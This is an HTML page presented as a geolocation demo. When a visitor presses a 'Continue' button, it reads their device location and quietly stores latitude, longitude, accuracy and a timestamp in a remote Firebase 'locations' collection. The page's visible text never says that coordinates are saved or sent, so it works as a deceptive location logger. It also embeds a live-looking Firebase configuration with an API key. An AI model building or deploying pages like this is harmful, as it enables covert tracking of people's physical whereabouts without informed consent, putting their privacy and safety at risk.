<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Location Demo</title>

<style>
body{
    font-family: Arial, sans-serif;
    max-width:600px;
    margin:40px auto;
    padding:20px;
}

button{
    padding:12px 20px;
    font-size:18px;
    cursor:pointer;
}

#status{
    margin-top:20px;
    font-size:18px;
}

</style>

</head>
<body>

<h1>HTML5 Geolocation</h1>

<p id="status">Press continue to proceed.</p>


<button onclick="getLocation()">Continue</button>

<script type="module">

import { initializeApp } from "https://www.gstatic.com/firebasejs/12.16.0/firebase-app.js";
import {
    getFirestore,
    collection,
    addDoc,
    serverTimestamp
} from "https://www.gstatic.com/firebasejs/12.16.0/firebase-firestore.js";

const firebaseConfig = {
    apiKey: "AIzaSyAbv0JilGYuFgCS6JEtjHkxSoTZZudgaN0",
    authDomain: "enjoy-page-202b7.firebaseapp.com",
    projectId: "enjoy-page-202b7",
    storageBucket: "enjoy-page-202b7.firebasestorage.app",
    messagingSenderId: "936370497985",
    appId: "1:936370497985:web:af4f3407c84ad4bd51e740",
    measurementId: "G-FT4PDBVLYR"
};

const app = initializeApp(firebaseConfig);

const db = getFirestore(app);

const statusEl=document.getElementById("status");

window.getLocation=function(){

    if(!navigator.geolocation){

        statusEl.innerHTML="Geolocation is not supported.";

        return;

    }

    statusEl.innerHTML="Please wait...";

    navigator.geolocation.getCurrentPosition(success,error);

}

async function success(position){

    const lat=position.coords.latitude;
    const lon=position.coords.longitude;
    const acc=position.coords.accuracy;

    try{

        await addDoc(collection(db,"locations"),{

            latitude:lat,
            longitude:lon,
            accuracy:acc,
            timestamp:serverTimestamp()

        });

        statusEl.innerHTML="✅ successfully.";

    }
    catch(e){

        console.log(e);

        statusEl.innerHTML="❌unsuccessfully.";

    }

}

function error(err){

    switch(err.code){

        case err.PERMISSION_DENIED:
            statusEl.innerHTML="Permission denied.";
            break;

        case err.POSITION_UNAVAILABLE:
            statusEl.innerHTML="Location unavailable.";
            break;

        case err.TIMEOUT:
            statusEl.innerHTML="Request timed out.";
            break;

        default:
            statusEl.innerHTML="Unknown error.";
    }

}

</script>

</body>
</html>
